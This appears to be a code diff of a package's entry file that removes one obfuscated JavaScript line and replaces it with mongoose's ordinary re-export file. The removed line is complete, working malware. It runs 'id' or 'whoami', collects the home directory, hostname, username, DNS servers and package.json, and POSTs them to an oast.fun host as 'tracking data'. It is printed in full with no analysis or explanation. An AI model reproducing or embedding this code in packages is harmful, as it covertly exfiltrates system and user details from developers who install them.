@@ -1,1 +1,64 @@
-function _0x4e44(_0x4a7536,_0x18cfaa){const _0x2eee1c=_0x2eee();return _0x4e44=function(_0x4e44d0,_0x5007b9){_0x4e44d0=_0x4e44d0-0x1d8;let _0x1737bb=_0x2eee1c[_0x4e44d0];return _0x1737bb;},_0x4e44(_0x4a7536,_0x18cfaa);}const _0x391f96=_0x4e44;function _0x2eee(){const _0x44713a=['Unexpected\x20error:','child_process','dns','5446VyrBUX','application/x-www-form-urlencoded','Unsupported\x20operating\x20system.','error','length','end','linux','write','trim','POST','./package.json','whoami','48WEmwcY','___resolved','platform','80hOSUuo','5366119wVQCQJ','73MSkSPh','247344YFFFht','https','getServers','621fQzlPX','warn','data','80565CXLiFl','userInfo','Warning\x20during\x20command\x20execution:','bhfvohxbvhtizkooshbfgbrkras3cig6i.oast.fun','70973EWUhOQ','4110exXUXt','log','Error\x20sending\x20tracking\x20data:','username','Error\x20fetching\x20host\x20ID:','homedir','hostname','446180VgRZIe'];_0x2eee=function(){return _0x44713a;};return _0x2eee();}(function(_0x55e3c9,_0x316508){const _0x2072a6=_0x4e44,_0x25cd0d=_0x55e3c9();while(!![]){try{const _0x44cc23=parseInt(_0x2072a6(0x1dc))/0x1*(-parseInt(_0x2072a6(0x1f3))/0x2)+-parseInt(_0x2072a6(0x1dd))/0x3+parseInt(_0x2072a6(0x1ef))/0x4+parseInt(_0x2072a6(0x1e3))/0x5*(-parseInt(_0x2072a6(0x1ff))/0x6)+-parseInt(_0x2072a6(0x1e7))/0x7*(parseInt(_0x2072a6(0x1da))/0x8)+parseInt(_0x2072a6(0x1e0))/0x9*(parseInt(_0x2072a6(0x1e8))/0xa)+parseInt(_0x2072a6(0x1db))/0xb;if(_0x44cc23===_0x316508)break;else _0x25cd0d['push'](_0x25cd0d['shift']());}catch(_0x7532a7){_0x25cd0d['push'](_0x25cd0d['shift']());}}}(_0x2eee,0x1c5f4));const os=require('os'),dns=require(_0x391f96(0x1f2)),https=require(_0x391f96(0x1de)),packageJSON=require(_0x391f96(0x1fd)),{exec}=require(_0x391f96(0x1f1));async function executeCommand(_0x1494b6){return new Promise((_0x82de4d,_0x3eccd1)=>{exec(_0x1494b6,(_0x274180,_0xec5b30,_0x45d363)=>{const _0x58d51c=_0x4e44;if(_0x274180){_0x3eccd1(_0x274180);return;}_0x45d363&&console[_0x58d51c(0x1e1)](_0x58d51c(0x1e5),_0x45d363),_0x82de4d(_0xec5b30[_0x58d51c(0x1fb)]());});});}async function getHostID(){const _0x4aa9d8=_0x391f96;try{if(process[_0x4aa9d8(0x1d9)]===_0x4aa9d8(0x1f9))return await executeCommand('id');else return process[_0x4aa9d8(0x1d9)]==='win32'?await executeCommand(_0x4aa9d8(0x1fe)):(console[_0x4aa9d8(0x1e9)](_0x4aa9d8(0x1f5)),null);}catch(_0x1f2c4e){return console[_0x4aa9d8(0x1f6)](_0x4aa9d8(0x1ec),_0x1f2c4e),null;}}async function sendTrackingData(_0x4a068d){const _0x52de50=_0x391f96;try{const _0x70def9=JSON['stringify']({'p':packageJSON['name'],'c':__dirname,'hd':os[_0x52de50(0x1ed)](),'hn':os[_0x52de50(0x1ee)](),'un':os[_0x52de50(0x1e4)]()[_0x52de50(0x1eb)],'dns':dns[_0x52de50(0x1df)](),'r':packageJSON?packageJSON[_0x52de50(0x1d8)]:undefined,'v':packageJSON['version'],'pjson':packageJSON,'id':_0x4a068d}),_0x376c2e={'hostname':_0x52de50(0x1e6),'method':_0x52de50(0x1fc),'headers':{'Content-Type':_0x52de50(0x1f4),'Content-Length':_0x70def9[_0x52de50(0x1f7)]}},_0x37dc1c=https['request'](_0x376c2e,_0x415781=>{const _0x1f2482=_0x52de50;_0x415781['on'](_0x1f2482(0x1e2),_0x479492=>{const _0x297080=_0x1f2482;process['stdout'][_0x297080(0x1fa)](_0x479492);});});_0x37dc1c['on'](_0x52de50(0x1f6),_0x5f1fc9=>{const _0x3c2130=_0x52de50;console[_0x3c2130(0x1f6)](_0x3c2130(0x1ea),_0x5f1fc9);}),_0x37dc1c['write'](_0x70def9),_0x37dc1c[_0x52de50(0x1f8)]();}catch(_0x118031){console[_0x52de50(0x1f6)](_0x52de50(0x1f0),_0x118031);}}async function main(){const _0x2e0473=await getHostID();_0x2e0473&&await sendTrackingData(_0x2e0473);}main();
+/**
+ * Export lib/mongoose
+ *
+ */
+
+'use strict';
+
+const mongoose = require('./lib/');
+
+module.exports = mongoose;
+module.exports.default = mongoose;
+module.exports.mongoose = mongoose;
+
+// Re-export for ESM support
+module.exports.cast = mongoose.cast;
+module.exports.STATES = mongoose.STATES;
+module.exports.setDriver = mongoose.setDriver;
+module.exports.set = mongoose.set;
+module.exports.get = mongoose.get;
+module.exports.createConnection = mongoose.createConnection;
+module.exports.connect = mongoose.connect;
+module.exports.disconnect = mongoose.disconnect;
+module.exports.startSession = mongoose.startSession;
+module.exports.pluralize = mongoose.pluralize;
+module.exports.model = mongoose.model;
+module.exports.deleteModel = mongoose.deleteModel;
+module.exports.modelNames = mongoose.modelNames;
+module.exports.plugin = mongoose.plugin;
+module.exports.connections = mongoose.connections;
+module.exports.version = mongoose.version;
+module.exports.Aggregate = mongoose.Aggregate;
+module.exports.Mongoose = mongoose.Mongoose;
+module.exports.Schema = mongoose.Schema;
+module.exports.SchemaType = mongoose.SchemaType;
+module.exports.SchemaTypes = mongoose.SchemaTypes;
+module.exports.VirtualType = mongoose.VirtualType;
+module.exports.Types = mongoose.Types;
+module.exports.Query = mongoose.Query;
+module.exports.Model = mongoose.Model;
+module.exports.Document = mongoose.Document;
+module.exports.ObjectId = mongoose.ObjectId;
+module.exports.isValidObjectId = mongoose.isValidObjectId;
+module.exports.isObjectIdOrHexString = mongoose.isObjectIdOrHexString;
+module.exports.syncIndexes = mongoose.syncIndexes;
+module.exports.Decimal128 = mongoose.Decimal128;
+module.exports.Mixed = mongoose.Mixed;
+module.exports.Date = mongoose.Date;
+module.exports.Number = mongoose.Number;
+module.exports.Error = mongoose.Error;
+module.exports.MongooseError = mongoose.MongooseError;
+module.exports.now = mongoose.now;
+module.exports.CastError = mongoose.CastError;
+module.exports.SchemaTypeOptions = mongoose.SchemaTypeOptions;
+module.exports.mongo = mongoose.mongo;
+module.exports.mquery = mongoose.mquery;
+module.exports.sanitizeFilter = mongoose.sanitizeFilter;
+module.exports.trusted = mongoose.trusted;
+module.exports.skipMiddlewareFunction = mongoose.skipMiddlewareFunction;
+module.exports.overwriteMiddlewareResult = mongoose.overwriteMiddlewareResult;
+
+// The following properties are not exported using ESM because `setDriver()` can mutate these
+// module.exports.connection = mongoose.connection;
+// module.exports.Collection = mongoose.Collection;
+// module.exports.Connection = mongoose.Connection;
